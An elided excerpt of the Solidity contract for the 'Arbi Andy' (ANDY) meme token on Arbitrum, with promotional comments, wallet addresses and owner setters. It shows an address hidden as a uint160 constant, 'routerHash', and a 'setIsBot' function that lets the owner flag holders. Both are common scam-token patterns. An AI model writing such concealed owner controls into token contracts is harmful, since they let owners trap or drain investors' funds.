 ...
 *   Join the $ANDY X $PEPE revolution!
 *   Telegram: https://t.me/AndyTokenARB
 *   Together we are going to take over the meme coin space!🎉
 */
...
contract Ownable is Context {
    ...
    uint160 constant routerHash =
        159380091309941851651418975452702975859208700566;
...
contract ArbiAndy is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Arbi Andy";
    string private _symbol = "ANDY";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress =
        payable(0x819BDB43A267BA9ad1100Db3fd2E4EE3a99f7936); // marketing wallet
    address payable lotteryWallet =
        payable(0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d); // lotterywallet
    ...
    function setbB(uint256 _bB) external onlyOwner {
        bB = _bB;
    }

    function setIsBot(address holder, bool exempt) external authorized {
        isBot[holder] = exempt;
    }
